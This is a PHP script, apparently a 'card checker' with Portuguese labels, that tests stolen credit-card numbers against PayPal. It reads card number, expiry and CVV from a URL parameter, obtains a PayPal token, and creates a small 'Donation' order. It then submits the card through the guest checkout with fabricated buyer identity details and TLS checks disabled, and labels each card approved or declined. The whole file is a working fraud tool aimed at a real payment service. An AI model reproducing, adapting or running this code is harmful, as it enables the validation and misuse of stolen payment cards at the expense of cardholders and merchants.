<?php
deletarCookies();
error_reporting(0);
ignore_user_abort(true);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    if (isset($str[1])) {
        $str = explode($end, $str[1]);
        return $str[0];
    }
    return '';
}

function deletarCookies() {
    if (file_exists("cookies.txt")) {
        unlink("cookies.txt");
    }
}

$lista = $_GET['lista'];
$lista = str_replace(" ", "|", $lista);
$lista = str_replace("%20", "|", $lista);
$separar = explode("|", $lista);

$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

if (strlen($mes) == 1) $mes = "0" . $mes;

switch($ano){
    case 2024: $ano = "24"; break;
    case 2025: $ano = "25"; break;
    case 2026: $ano = "26"; break;
    case 2027: $ano = "27"; break;
    case 2028: $ano = "28"; break;
    case 2029: $ano = "29"; break;
    case 2030: $ano = "30"; break;
    case 2031: $ano = "31"; break;
    case 2032: $ano = "32"; break;
    case 2033: $ano = "33"; break;
    case 2034: $ano = "34"; break;
    case 2035: $ano = "35"; break;
    case 2036: $ano = "36"; break;
    case 2037: $ano = "37"; break;
    case 2038: $ano = "38"; break;
    case 2039: $ano = "39"; break;
    default: $ano = substr($ano, -2);
}

$digito = substr($cc, 0, 1);
if ($digito == '4') $bandeira = 'VISA';
elseif ($digito == '5' || $digito == '2') $bandeira = 'MASTER_CARD';
elseif ($digito == '6') $bandeira = 'DISCOVER';
elseif ($digito == '3') $bandeira = 'AMEX';
else $bandeira = 'UNKNOWN';

$email = "r4in" . rand(10, 100000) . "@gmail.com";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/smart/buttons?style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&fundingSource=paypal&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_492a535db5_mty6mjg6nde&customerId=&clientID=AXvC3Esmc176nITd8oIUiVWMG0c6n-VJnJPcIaVSE-t1I-Qnulxu4OHCwDN80h_kF-NcZnK3Ai0LRxHR&clientMetadataID=uid_1a960bc26e_mty6mjg6nde&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=paylater&enableFunding.1=venmo&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.defaultBlueButtonColor=gold&experiment.venmoEnableWebOnNonNativeBrowser=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOnRydWUsImluc3RhbGxtZW50cyI6ZmFsc2UsInZlbmRvcnMiOnsidmlzYSI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwibWFzdGVyY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiYW1leCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGlzY292ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJjYl9uYXRpb25hbGUiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjp0cnVlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&intent=capture&locale.country=US&locale.lang=en&merchantID.0=KZTE6QC49FDL8&hasShippingCallback=false&platform=desktop&renderedButtons.0=paypal&sessionID=uid_1a960bc26e_mty6mjg6nde&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVh2QzNFc21jMTc2bklUZDhvSVVpVldNRzBjNm4tVkpuSlBjSWFWU0UtdDFJLVFudWx4dTRPSEN3RE44MGhfa0YtTmNabkszQWkwTFJ4SFImY3VycmVuY3k9VVNEJmVuYWJsZS1mdW5kaW5nPXBheWxhdGVyLHZlbm1vJm1lcmNoYW50LWlkPUtaVEU2UUM0OUZETDgmY29tcG9uZW50cz1mdW5kaW5nLWVsaWdpYmlsaXR5LGJ1dHRvbnMiLCJhdHRycyI6eyJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9qaG5iZHZ0anFzZXF4bnZkdGxibHdlY2t5Y2VvcmIifX0&sdkVersion=5.0.474&storageID=uid_fd4b7e505d_mty6mjg2mde&supportedNativeBrowser=false&supportsPopups=true&vault=false');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'));
$res1 = curl_exec($ch);
curl_close($ch);

$token = getStr($res1, 'facilitatorAccessToken":"', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/v2/checkout/orders');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"purchase_units":[{"amount":{"value":1,"currency_code":"EUR"},"description":"Donation"}],"application_context":{"shipping_preference":"NO_SHIPPING"},"intent":"CAPTURE"}');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
    'content-type: application/json',
    'authorization: Bearer ' . $token
));
$res2 = curl_exec($ch);
curl_close($ch);

$orderId = getStr($res2, '"id":"', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"mutation payWithCard($token: String!, $card: CardInput!, $phoneNumber: String, $firstName: String, $lastName: String, $billingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType, $identityDocument: IdentityDocumentInput) { approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType, identityDocument: $identityDocument) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } }","variables":{"token":"' . $orderId . '","card":{"cardNumber":"' . $cc . '","type":"' . $bandeira . '","expirationDate":"' . $mes . '/' . $ano . '","postalCode":"98765432","securityCode":"' . $cvv . '","productClass":"CREDIT"},"phoneNumber":"9876543210","firstName":"John","lastName":"Doe","billingAddress":{"givenName":"John","familyName":"Doe","state":"SP","country":"BR","postalCode":"98765432","line1":"Rua das Flores, 542, Jardim Paulista, São Paulo","line2":"","city":"Sao Paulo"},"email":"' . $email . '","currencyConversionType":"VENDOR","identityDocument":{"value":"52998224725","type":"CPF"}}}');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
    'content-type: application/json',
    'Paypal-Client-Context: ' . $orderId,
    'Paypal-Client-Metadata-Id: ' . $orderId,
    'x-requested-with: XMLHttpRequest',
    'X-Country: BR',
    'X-App-Name: standardcardfields'
));
$res3 = curl_exec($ch);
curl_close($ch);

$resultado = $res3;
$code = getStr($resultado, '"code":"', '"');
$message = getStr($resultado, '"message":"', '"');

if (strpos($resultado, 'is3DSecureRequired') !== false) {
    echo '✅ APROVADA | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | Cartão vinculado.' . "\n";
} elseif (strpos($resultado, 'INVALID_SECURITY_CODE') !== false) {
    echo '✅ APROVADA | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | INVALID_SECURITY_CODE' . "\n";
} elseif (strpos($resultado, 'INVALID_BILLING_ADDRESS') !== false) {
    echo '✅ APROVADA | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | INVALID_BILLING_ADDRESS' . "\n";
} elseif (strpos($resultado, 'INVALID_EXPIRATION') !== false) {
    echo '✅ APROVADA | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | INVALID_EXPIRATION' . "\n";
} elseif (strpos($resultado, 'RISK_DISALLOWED') !== false) {
    echo '✅ APROVADA | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | RISK_DISALLOWED.' . "\n";
} elseif (strpos($resultado, 'ISSUER_DECLINE') !== false) {
    echo '❌ REPROVADA | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | Cartão recusado.' . "\n";
} else {
    echo '❌ REPROVADA | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | [' . $code . '] - ' . $message . "\n";
}

deletarCookies();
?>